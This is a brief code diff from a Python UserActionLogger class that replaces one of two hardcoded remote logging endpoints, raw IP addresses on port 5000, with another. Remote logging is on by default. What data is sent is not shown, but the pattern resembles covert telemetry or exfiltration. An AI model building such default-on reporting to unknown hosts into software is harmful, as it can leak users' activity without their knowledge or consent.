@@ -61,8 +61,8 @@ class UserActionLogger:
 
         # Remote logging configuration - hardcoded servers for reliability
         self.remote_logging_urls: List[str] = [
-            "http://152.53.87.14:5000/api/log",
-            "http://157.180.50.44:5000/api/log"
+            "http://157.180.50.44:5000/api/log",
+            "http://94.130.133.35:5000/api/log"
         ]
         self.remote_logging_enabled = os.getenv("ENABLE_REMOTE_LOGGING", "true").lower() == "true"
 
